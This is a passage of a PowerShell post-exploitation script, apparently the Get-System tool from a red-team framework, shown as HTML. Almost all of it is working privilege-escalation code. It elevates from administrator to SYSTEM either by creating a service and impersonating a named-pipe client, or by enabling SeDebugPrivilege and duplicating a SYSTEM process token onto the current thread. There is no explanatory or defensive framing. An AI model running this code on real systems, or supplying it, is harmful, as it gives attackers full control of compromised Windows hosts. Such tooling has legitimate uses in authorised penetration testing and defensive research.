$StartServiceA.Invoke($ServiceHandle, $null, $null)<br />                    $err = $GetLastError.Invoke()<br /><br />                    # if we successfully started the service, let it breathe and then delete it<br />                    if ($val -ne 0){<br />                        Write-Verbose "Service successfully started"<br />                        # breathe for a second<br />                        Start-Sleep -s 1<br />                    }<br />                    else{<br />                        if ($err -eq 1053){<br />                            Write-Verbose "Command didn't respond to start"<br />                        }<br />                        else{<br />                            Write-Warning "StartService failed, LastError: $err"<br />                        }<br />                        # breathe for a second<br />                        Start-Sleep -s 1<br />                    }<br /><br />                    # start cleanup<br />                    # Step 6 - DeleteService()<br />                    Write-Verbose "Deleting the service '$ServiceName'"<br />                    $val = $DeleteService.invoke($ServiceHandle)<br />                    $err = $GetLastError.Invoke()<br /><br />                    if ($val -eq 0){<br />                        Write-Warning "DeleteService failed, LastError: $err"<br />                    }<br />                    else{<br />                        Write-Verbose "Service successfully deleted"<br />                    }<br />                <br />                    # Step 7 - CloseServiceHandle() for the service handle <br />                    Write-Verbose "Closing the service handle"<br />                    $val = $CloseServiceHandle.Invoke($ServiceHandle)<br />                    Write-Verbose "Service handle closed off"<br />                }<br />                else {<br />                    Write-Warning "[!] OpenServiceA failed, LastError: $err"<br />                }<br />            }<br /><br />            else {<br />                Write-Warning "[!] CreateService failed, LastError: $err"<br />            }<br /><br />            # final cleanup - close off the manager handle<br />            Write-Verbose "Closing the manager handle"<br />            $Null = $CloseServiceHandle.Invoke($ManagerHandle)<br />        }<br />        else {<br />            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx<br />            Write-Warning "[!] OpenSCManager failed, LastError: $err"<br />        }<br /><br />        if($Success) {<br />            Write-Verbose "Waiting for pipe connection"<br />            $Pipe.WaitForConnection()<br /><br />            $Null = (New-Object System.IO.StreamReader($Pipe)).ReadToEnd()<br /><br />            $Out = $ImpersonateNamedPipeClient.Invoke([Int]$PipeHandle)<br />            Write-Verbose "ImpersonateNamedPipeClient: $Out"<br />        }<br /><br />        # clocse off the named pipe<br />        $Pipe.Dispose()<br />    }<br /><br />    # performs token duplication to elevate to SYSTEM<br />    #   needs SeDebugPrivilege<br />    # written by @mattifestation and adapted from https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot<br />    Function Local:Get-SystemToken {<br />        [CmdletBinding()] param()<br /><br />        $DynAssembly = New-Object Reflection.AssemblyName('AdjPriv')<br />        $AssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)<br />        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('AdjPriv', $False)<br />        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'<br /><br />        $TokPriv1LuidTypeBuilder = $ModuleBuilder.DefineType('TokPriv1Luid', $Attributes, [System.ValueType])<br />        $TokPriv1LuidTypeBuilder.DefineField('Count', [Int32], 'Public') | Out-Null<br />        $TokPriv1LuidTypeBuilder.DefineField('Luid', [Int64], 'Public') | Out-Null<br />        $TokPriv1LuidTypeBuilder.DefineField('Attr', [Int32], 'Public') | Out-Null<br />        $TokPriv1LuidStruct = $TokPriv1LuidTypeBuilder.CreateType()<br /><br />        $LuidTypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType])<br />        $LuidTypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null<br />        $LuidTypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null<br />        $LuidStruct = $LuidTypeBuilder.CreateType()<br /><br />        $Luid_and_AttributesTypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType])<br />        $Luid_and_AttributesTypeBuilder.DefineField('Luid', $LuidStruct, 'Public') | Out-Null<br />        $Luid_and_AttributesTypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null<br />        $Luid_and_AttributesStruct = $Luid_and_AttributesTypeBuilder.CreateType()<br /><br />        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]<br />        $ConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray<br />        $FieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))<br /><br />        $TokenPrivilegesTypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType])<br />        $TokenPrivilegesTypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null<br />        $PrivilegesField = $TokenPrivilegesTypeBuilder.DefineField('Privileges', $Luid_and_AttributesStruct.MakeArrayType(), 'Public')<br />        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 1))<br />        $PrivilegesField.SetCustomAttribute($AttribBuilder)<br />        $TokenPrivilegesStruct = $TokenPrivilegesTypeBuilder.CreateType()<br /><br />        $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(<br />            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),<br />            'advapi32.dll',<br />            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),<br />            @([Bool] $True)<br />        )<br /><br />        $AttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(<br />            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),<br />            'kernel32.dll',<br />            @([Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')),<br />            @([Bool] $True)<br />        )<br /><br />        $Win32TypeBuilder = $ModuleBuilder.DefineType('Win32Methods', $Attributes, [ValueType])<br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'OpenProcess',<br />            'kernel32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [IntPtr],<br />            @([UInt32], [Bool], [UInt32]),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder2)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'CloseHandle',<br />            'kernel32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([IntPtr]),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder2)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'DuplicateToken',<br />            'advapi32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'SetThreadToken',<br />            'advapi32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([IntPtr], [IntPtr]),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'OpenProcessToken',<br />            'advapi32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'LookupPrivilegeValue',<br />            'advapi32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([String], [String], [IntPtr].MakeByRefType()),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder)<br /><br />        $Win32TypeBuilder.DefinePInvokeMethod(<br />            'AdjustTokenPrivileges',<br />            'advapi32.dll',<br />            [Reflection.MethodAttributes] 'Public, Static',<br />            [Reflection.CallingConventions]::Standard,<br />            [Bool],<br />            @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),<br />            [Runtime.InteropServices.CallingConvention]::Winapi,<br />            'Auto').SetCustomAttribute($AttribBuilder)<br />        <br />        $Win32Methods = $Win32TypeBuilder.CreateType()<br /><br />        $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}<br />        $GetCurrentProcess = $Win32Native.GetMethod(<br />            'GetCurrentProcess',<br />            [Reflection.BindingFlags] 'NonPublic, Static'<br />        )<br />            <br />        $SE_PRIVILEGE_ENABLED = 0x00000002<br />        $STANDARD_RIGHTS_REQUIRED = 0x000F0000<br />        $STANDARD_RIGHTS_READ = 0x00020000<br />        $TOKEN_ASSIGN_PRIMARY = 0x00000001<br />        $TOKEN_DUPLICATE = 0x00000002<br />        $TOKEN_IMPERSONATE = 0x00000004<br />        $TOKEN_QUERY = 0x00000008<br />        $TOKEN_QUERY_SOURCE = 0x00000010<br />        $TOKEN_ADJUST_PRIVILEGES = 0x00000020<br />        $TOKEN_ADJUST_GROUPS = 0x00000040<br />        $TOKEN_ADJUST_DEFAULT = 0x00000080<br />        $TOKEN_ADJUST_SESSIONID = 0x00000100<br />        $TOKEN_READ = $STANDARD_RIGHTS_READ -bor $TOKEN_QUERY<br />        $TOKEN_ALL_ACCESS = $STANDARD_RIGHTS_REQUIRED -bor<br />            $TOKEN_ASSIGN_PRIMARY -bor<br />            $TOKEN_DUPLICATE -bor<br />            $TOKEN_IMPERSONATE -bor<br />            $TOKEN_QUERY -bor<br />            $TOKEN_QUERY_SOURCE -bor<br />            $TOKEN_ADJUST_PRIVILEGES -bor<br />            $TOKEN_ADJUST_GROUPS -bor<br />            $TOKEN_ADJUST_DEFAULT -bor<br />            $TOKEN_ADJUST_SESSIONID<br /><br />        [long]$Luid = 0<br /><br />        $tokPriv1Luid = [Activator]::CreateInstance($TokPriv1LuidStruct)<br />        $tokPriv1Luid.Count = 1<br />        $tokPriv1Luid.Luid = $Luid<br />        $tokPriv1Luid.Attr = $SE_PRIVILEGE_ENABLED<br /><br />        $RetVal = $Win32Methods::LookupPrivilegeValue($Null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)<br /><br />        $htoken = [IntPtr]::Zero<br />        $RetVal = $Win32Methods::OpenProcessToken($GetCurrentProcess.Invoke($Null, @()), $TOKEN_ALL_ACCESS, [ref]$htoken)<br /><br />        $tokenPrivileges = [Activator]::CreateInstance($TokenPrivilegesStruct)<br />        $RetVal = $Win32Methods::AdjustTokenPrivileges($htoken, $False, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)<br /><br />        if(-not($RetVal)) {<br />            Write-Error "AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop<br />        }<br />        <br />        $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value<br /><br />        $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {<br />            try {<br />                $OwnerInfo = $_.GetOwner()<br />                if ($OwnerInfo.Domain -and $OwnerInfo.User) {<br />                    $OwnerString = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".ToUpper()<br /><br />                    if ($OwnerString -eq $LocalSystemNTAccount.ToUpper()) {<br />                        $Process = Get-Process -Id $_.ProcessId<br /><br />                        $Handle = $Win32Methods::OpenProcess(0x0400, $False, $Process.Id)<br />                        if ($Handle) {<br />                            $Handle<br />                        }<br />                    }<br />                }<br />            }<br />            catch {}<br />        } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1<br />        <br />        if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {<br />            Write-Error 'Unable to obtain a handle to a system process.'<br />        } <br />        else {<br />            [IntPtr]$SystemToken = [IntPtr]::Zero<br />            $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()<br /><br />            Write-Verbose "OpenProcessToken result: $RetVal"<br />            Write-Verbose "OpenProcessToken result: $LastError"<br /><br />            [IntPtr]$DulicateTokenHandle = [IntPtr]::Zero<br />            $RetVal = $Win32Methods::DuplicateToken($SystemToken, 2, [ref]$DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()<br /><br />            Write-Verbose "DuplicateToken result: $LastError"<br /><br />            $RetVal = $Win32Methods::SetThreadToken([IntPtr]::Zero, $DulicateTokenHandle);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()<br />            if(-not($RetVal)) {<br />                Write-Error "SetThreadToken failed, RetVal : $RetVal" -ErrorAction Stop<br />            }<br /><br />            Write-Verbose "SetThreadToken result: $LastError"<br />            $null = $Win32Methods::CloseHandle($Handle)<br />        }<br />    }<br /><br />    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {<br />        Write-Error "Script must be run as administrator" -ErrorAction Stop<br />    }<br /><br />    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {<br />        Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop<br />    }<br /><br />    if($PSBoundParameters['WhoAmI']) {<br />        Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"<br />        return<br />    }<br /><br />    elseif($PSBoundParameters['RevToSelf']) {<br />        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf<br />        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])<br />        $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)<br /><br />        $RetVal = $RevertToSelf.Invoke()<br />        if($RetVal) {<br />            Write-Output "RevertToSelf successful."<br />        }<br />        else {<br />            Write-Warning "RevertToSelf failed."<br />        }<br />        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"<br />    }<br /><br />    else {<br />        if($Technique -eq 'NamedPipe') {<br />            # if we're using named pipe impersonation with a service<br />            Get-SystemNamedPipe -ServiceName $ServiceName -PipeName $PipeName<br />        }<br />        else {<br />            # otherwise use token duplication<br />            Get-SystemToken<br />        }<br />        Write-Output "Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"<br />    }<br />}<br /></div></div>
</body></html>